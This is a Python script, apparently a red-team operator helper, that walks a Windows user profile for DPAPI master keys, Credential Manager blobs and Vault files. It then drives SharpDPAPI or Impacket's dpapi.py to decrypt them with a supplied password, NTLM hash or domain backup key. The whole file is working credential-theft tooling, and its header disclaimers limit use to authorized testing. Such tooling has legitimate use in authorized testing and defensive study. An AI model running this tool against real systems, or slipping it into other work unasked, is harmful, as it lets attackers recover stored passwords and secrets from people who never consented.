#!/usr/bin/env python3
# For authorized penetration testing and educational environments only.
# Usage against targets without prior mutual written consent is illegal.
# It is the end user's responsibility to obey all applicable laws.
"""DPAPI triage orchestrator.

Locates DPAPI artifacts (master keys, Credential Manager blobs, Vault entries)
on a mounted/exfiltrated user profile and drives SharpDPAPI (on Windows) or
Impacket's dpapi.py (cross-platform) to decrypt them with a supplied password,
NTLM hash, or domain backup key (.pvk).

This is an operator helper: it builds and runs the real tool commands and
parses their output; it does not reimplement DPAPI cryptography.
"""

import argparse
import os
import shutil
import subprocess
import sys
from datetime import datetime, timezone

# Standard relative locations inside a Windows user profile.
PROTECT_REL = os.path.join("AppData", "Roaming", "Microsoft", "Protect")
CRED_REL = os.path.join("AppData", "Local", "Microsoft", "Credentials")
VAULT_LOCAL_REL = os.path.join("AppData", "Local", "Microsoft", "Vault")
VAULT_ROAM_REL = os.path.join("AppData", "Roaming", "Microsoft", "Vault")


def find_tool(candidates):
    """Return the first available tool path from candidates, else None."""
    for name in candidates:
        path = shutil.which(name)
        if path:
            return path
    return None


def enumerate_artifacts(profile):
    """Walk a user profile and collect DPAPI artifact file paths."""
    found = {"masterkeys": [], "credentials": [], "vaults": []}
    mapping = {
        "masterkeys": os.path.join(profile, PROTECT_REL),
        "credentials": os.path.join(profile, CRED_REL),
        "vaults": os.path.join(profile, VAULT_LOCAL_REL),
    }
    for key, base in mapping.items():
        if not os.path.isdir(base):
            continue
        for root, _dirs, files in os.walk(base):
            for fname in files:
                # Master keys are GUID-named; skip preferred/BK marker files noise.
                found[key].append(os.path.join(root, fname))
    # Also include roaming vault if present.
    vroam = os.path.join(profile, VAULT_ROAM_REL)
    if os.path.isdir(vroam):
        for root, _dirs, files in os.walk(vroam):
            for fname in files:
                found["vaults"].append(os.path.join(root, fname))
    return found


def run_cmd(cmd, timeout):
    """Run an external command and return (rc, stdout, stderr)."""
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return proc.returncode, proc.stdout, proc.stderr
    except FileNotFoundError:
        return 127, "", f"tool not found: {cmd[0]}"
    except subprocess.TimeoutExpired:
        return 124, "", f"timeout after {timeout}s"


def decrypt_masterkey_impacket(tool, mk_file, pvk, timeout):
    """Decrypt one master key file via impacket-dpapi using a backup .pvk."""
    cmd = [tool, "masterkey", "-file", mk_file, "-pvk", pvk]
    rc, out, err = run_cmd(cmd, timeout)
    return {"file": mk_file, "rc": rc, "output": (out or err).strip()[:2000]}


def sharpdpapi_triage(tool, profile, pvk, password, ntlm, timeout):
    """Build and run a SharpDPAPI triage command appropriate to the inputs."""
    cmd = [tool, "triage"]
    if pvk:
        cmd += [f"/pvk:{pvk}"]
    elif password:
        cmd += [f"/password:{password}"]
    elif ntlm:
        cmd += [f"/ntlm:{ntlm}"]
    else:
        cmd += ["/unprotect"]
    rc, out, err = run_cmd(cmd, timeout)
    return {"rc": rc, "output": (out or err).strip()}


def main():
    parser = argparse.ArgumentParser(description="Authorized DPAPI triage helper")
    parser.add_argument("--profile", help="Path to a (mounted) Windows user profile")
    parser.add_argument("--pvk", help="Domain DPAPI backup key (.pvk)")
    parser.add_argument("--password", help="User plaintext password")
    parser.add_argument("--ntlm", help="User NTLM hash")
    parser.add_argument("--mode", choices=["enumerate", "impacket", "sharpdpapi"],
                        default="enumerate",
                        help="enumerate artifacts, or drive a decryption tool")
    parser.add_argument("--timeout", type=int, default=120, help="Per-command timeout")
    args = parser.parse_args()

    ts = datetime.now(timezone.utc).isoformat()
    print(f"[*] DPAPI triage helper — {ts}")
    print("[!] Authorized use only. Confirm rules-of-engagement before proceeding.\n")

    if args.mode in ("enumerate", "impacket"):
        if not args.profile or not os.path.isdir(args.profile):
            print("[!] --profile must point to an existing user profile directory",
                  file=sys.stderr)
            sys.exit(2)
        artifacts = enumerate_artifacts(args.profile)
        for kind, items in artifacts.items():
            print(f"--- {kind.upper()} ({len(items)}) ---")
            for p in items:
                print(f"  {p}")
        if args.mode == "impacket":
            if not args.pvk:
                print("\n[!] --pvk required for impacket master key decryption",
                      file=sys.stderr)
                sys.exit(2)
            tool = find_tool(["impacket-dpapi", "dpapi.py"])
            if not tool:
                print("[!] impacket-dpapi not found. Install: pipx install impacket",
                      file=sys.stderr)
                sys.exit(2)
            print("\n=== Decrypting master keys with backup key ===")
            for mk in artifacts["masterkeys"]:
                res = decrypt_masterkey_impacket(tool, mk, args.pvk, args.timeout)
                print(f"  [{res['rc']}] {res['file']}")
                if res["output"]:
                    print(f"      {res['output'][:300]}")
        return

    # sharpdpapi mode (Windows operator host)
    tool = find_tool(["SharpDPAPI.exe", "SharpDPAPI"])
    if not tool:
        print("[!] SharpDPAPI not found on PATH. Build from "
              "https://github.com/GhostPack/SharpDPAPI", file=sys.stderr)
        sys.exit(2)
    result = sharpdpapi_triage(tool, args.profile, args.pvk, args.password,
                               args.ntlm, args.timeout)
    print("=== SharpDPAPI triage ===")
    print(result["output"])
    sys.exit(0 if result["rc"] == 0 else 1)


if __name__ == "__main__":
    main()
